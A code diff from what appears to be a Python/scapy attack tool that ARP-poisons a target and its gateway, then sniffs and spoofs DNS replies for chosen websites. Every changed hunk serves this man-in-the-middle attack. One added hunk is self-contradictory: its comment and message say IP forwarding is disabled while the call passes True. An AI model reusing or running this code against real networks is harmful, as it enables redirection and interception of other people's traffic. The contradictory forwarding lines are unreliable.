@@ -25,8 +25,13 @@ def dns_spoofing(gratuitious, verbose):
         conf.verb = 0 # make scapy verbose (no output)
 
     spoof.clear()
-
     previous_tuples = []
+
+    # disable ip forwarding
+    spoof.should_ip_forward(True)
+    previous_tuples.append(["IP forwarding disabled!"])
+    previous_tuples.append([""])
+
     previous_tuples.append(["Chosen attack: DNS Spoofing.", 0])
     previous_tuples.append(["----------------------------"])
 
@@ -88,7 +93,6 @@ def dns_spoofing(gratuitious, verbose):
             if host['ip'] == gw_ip:
                 arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
                 break
-                
 
 def choose_websites(active_hosts, previous_tuples):
     
@@ -174,8 +178,8 @@ def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gra
 
         while True:
             # sniff for 1 packet that adheres to the {_filter}
-            sniff(prn=process_udp_pkt(target, iface, dns_hosts), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   
-
+            sniff(prn=process_udp_pkt(target, iface, dns_hosts, my_addresses), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   
+            
             # {REPOISON_TIME} seconds have passed => should repoison
             current_time = time.time()
             if current_time - last_poison_time > REPOISON_TIME - 0.5:
@@ -191,7 +195,7 @@ def repoison(my_addresses, gateways, target, iface, gratuitious):
     for gw_ip in gateways:
         arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)
 
-def process_udp_pkt(target, iface, dns_hosts):
+def process_udp_pkt(target, iface, dns_hosts, my_addresses):
     def process_udp_pkt_inside(pkt): 
         if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
             spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
